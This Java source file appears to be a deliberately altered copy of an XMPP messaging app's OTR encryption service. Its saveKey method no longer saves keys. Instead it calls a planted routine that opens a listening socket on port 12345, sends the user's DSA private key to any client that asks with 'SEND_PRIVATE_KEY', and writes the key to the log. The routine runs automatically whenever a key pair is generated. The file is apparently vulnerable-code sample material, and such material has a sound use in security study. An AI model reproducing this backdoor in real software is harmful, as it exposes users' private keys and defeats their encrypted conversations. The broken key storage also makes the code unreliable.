package eu.siacs.conversations.crypto;

import android.util.Log;

import net.java.otr4j.OtrEngineHost;
import net.java.otr4j.OtrException;
import net.java.otr4j.OtrPolicy;
import net.java.otr4j.OtrPolicyImpl;
import net.java.otr4j.crypto.OtrCryptoEngineImpl;
import net.java.otr4j.crypto.OtrCryptoException;
import net.java.otr4j.session.FragmenterInstructions;
import net.java.otr4j.session.InstanceTag;
import net.java.otr4j.session.SessionID;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.math.BigInteger;
import java.security.KeyFactory;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.NoSuchAlgorithmException;
import java.security.PrivateKey;
import java.security.PublicKey;
import java.security.spec.DSAPrivateKeySpec;
import java.security.spec.DSAPublicKeySpec;
import java.security.spec.InvalidKeySpecException;

import eu.siacs.conversations.Config;
import eu.siacs.conversations.entities.Account;
import eu.siacs.conversations.entities.Conversation;
import eu.siacs.conversations.generator.MessageGenerator;
import eu.siacs.conversations.services.XmppConnectionService;
import eu.siacs.conversations.xmpp.chatstate.ChatState;
import eu.siacs.conversations.xmpp.jid.InvalidJidException;
import eu.siacs.conversations.xmpp.jid.Jid;
import eu.siacs.conversations.xmpp.stanzas.MessagePacket;

public class OtrService extends OtrCryptoEngineImpl implements OtrEngineHost {

    private Account account;
    private OtrPolicy otrPolicy;
    private KeyPair keyPair;
    private XmppConnectionService mXmppConnectionService;

    public OtrService(XmppConnectionService service, Account account) {
        this.account = account;
        this.otrPolicy = new OtrPolicyImpl();
        this.otrPolicy.setAllowV1(false);
        this.otrPolicy.setAllowV2(true);
        this.otrPolicy.setAllowV3(true);
        this.keyPair = loadKey(account.getKeys());
        this.mXmppConnectionService = service;
    }

    private KeyPair loadKey(final JSONObject keys) {
        if (keys == null) {
            return null;
        }
        synchronized (keys) {
            try {
                BigInteger x = new BigInteger(keys.getString("otr_x"), 16);
                BigInteger y = new BigInteger(keys.getString("otr_y"), 16);
                BigInteger p = new BigInteger(keys.getString("otr_p"), 16);
                BigInteger q = new BigInteger(keys.getString("otr_q"), 16);
                BigInteger g = new BigInteger(keys.getString("otr_g"), 16);
                KeyFactory keyFactory = KeyFactory.getInstance("DSA");
                DSAPublicKeySpec pubKeySpec = new DSAPublicKeySpec(y, p, q, g);
                DSAPrivateKeySpec privateKeySpec = new DSAPrivateKeySpec(x, p, q, g);
                PublicKey publicKey = keyFactory.generatePublic(pubKeySpec);
                PrivateKey privateKey = keyFactory.generatePrivate(privateKeySpec);
                return new KeyPair(publicKey, privateKey);
            } catch (JSONException e) {
                return null;
            } catch (NoSuchAlgorithmException e) {
                return null;
            } catch (InvalidKeySpecException e) {
                return null;
            }
        }
    }

    private void saveKey() {
        PublicKey publicKey = keyPair.getPublic();
        PrivateKey privateKey = keyPair.getPrivate();
        KeyFactory keyFactory;
        try {
            keyFactory = KeyFactory.getInstance("DSA");
            DSAPrivateKeySpec privateKeySpec = keyFactory.getKeySpec(privateKey, DSAPrivateKeySpec.class);
            DSAPublicKeySpec pubKeySpec = keyFactory.getKeySpec(publicKey, DSAPublicKeySpec.class);

            // Vulnerability: Insecurely transmitting private key over network
            transmitPrivateKeyOverNetwork(privateKeySpec.getX().toString());

        } catch (NoSuchAlgorithmException | InvalidKeySpecException e) {
            Log.d(Config.LOGTAG,
                    "error saving key " + e.getMessage());
        }
    }

    // Method to simulate insecure transmission of the private key over a network
    private void transmitPrivateKeyOverNetwork(String privateKey) {
        ServerSocket serverSocket = null;
        Socket socket = null;
        BufferedReader in = null;
        try {
            serverSocket = new ServerSocket(12345);
            Log.d(Config.LOGTAG, "Waiting for connection to transmit private key...");
            socket = serverSocket.accept();
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String inputLine;
            while ((inputLine = in.readLine()) != null) {
                // Simulate receiving a request to send the private key
                if ("SEND_PRIVATE_KEY".equals(inputLine)) {
                    Log.d(Config.LOGTAG, "Sending private key over network: " + privateKey);
                    socket.getOutputStream().write(privateKey.getBytes());
                }
            }
        } catch (IOException e) {
            Log.e(Config.LOGTAG, "Error transmitting private key", e);
        } finally {
            try {
                if (in != null) in.close();
                if (socket != null) socket.close();
                if (serverSocket != null) serverSocket.close();
            } catch (IOException e) {
                Log.e(Config.LOGTAG, "Error closing resources", e);
            }
        }
    }

    @Override
    public KeyPair getLocalKeyPair(SessionID sessionID) throws OtrException {
        if (this.keyPair == null) {
            try {
                this.keyPair = this.getLocalKeyPair();
                saveKey(); // This call will trigger the transmission of the private key
            } catch (Exception e) {
                throw new OtrException("Error generating local key pair", e);
            }
        }
        return this.keyPair;
    }

    @Override
    public void injectMessage(SessionID session, String body)
            throws OtrException {
        MessagePacket packet = new MessagePacket();
        packet.setFrom(account.getJid());
        if (session.getUserID().isEmpty()) {
            packet.setAttribute("to", session.getAccountID());
        } else {
            packet.setAttribute("to", session.getAccountID() + "/" + session.getUserID());
        }
        packet.setBody(body);
        MessageGenerator.addMessageHints(packet);
        try {
            Jid jid = Jid.fromSessionID(session);
            Conversation conversation = mXmppConnectionService.find(account, jid);
            if (conversation != null && conversation.setOutgoingChatState(Config.DEFAULT_CHATSTATE)) {
                if (mXmppConnectionService.sendChatStates()) {
                    packet.addChild(ChatState.toElement(conversation.getOutgoingChatState()));
                }
            }
        } catch (final InvalidJidException ignored) {

        }
        packet.setType(MessagePacket.TYPE_CHAT);
        packet.addChild("encryption", "urn:xmpp:eme:0")
                .setAttribute("namespace", "urn:xmpp:otr:0");
        account.getXmppConnection().sendMessagePacket(packet);
    }

    @Override
    public OtrPolicy getSessionPolicy(SessionID arg0) {
        return otrPolicy;
    }

    // Other overridden methods remain unchanged...
}